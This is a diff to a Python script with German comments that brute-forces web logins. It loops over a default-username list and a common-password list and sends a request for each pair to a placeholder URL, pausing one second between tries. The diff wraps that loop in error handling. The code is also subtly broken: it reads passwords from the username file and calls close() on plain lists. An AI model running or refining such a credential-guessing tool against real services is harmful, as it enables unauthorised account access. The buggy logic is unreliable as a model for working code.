@@ -3,12 +3,13 @@ import requests
 import json
 import base64
 import time
+import sys
 
 # Doku: https://docs.python-requests.org/de/latest/user/quickstart.html
 
 user_namelist_file = "./default_users_for_services.txt"
 password_namelist_file = "./most_used_passwords.txt"
-url = 'https://www. the domain/'
+url = "https://www/"
 # GET - ohne Header und Body
 #rGet = requests.get(url) # get request
 #print(rGet.text) # gibt html zurueck
@@ -60,13 +61,22 @@ def send_request(username, password):
 
 # main Funktion
 if __name__ == "__main__":
-    users = open(user_namelist_file).readlines()
-    passwords = open(user_namelist_file).readlines()
-    for usr in users:
-        for pwd in passwords:
-            send_request(usr, pwd)
-            #time.sleep(random.randint(1,1000)/10)
-            time.sleep(1)
+    try:
+        users = open(user_namelist_file).readlines()
+        passwords = open(user_namelist_file).readlines()
+        for usr in users:
+            for pwd in passwords:
+                send_request(usr, pwd)
+                #time.sleep(random.randint(1,1000)/10)
+                time.sleep(1)
+    except:
+        (type, value, traceback) = sys.exc_info()
+        print("Type: ", type)
+        print("Value: ", value)
+        print("traceback: ", traceback)
+    finally:
+        users.close()
+        passwords.close()
 
 
 
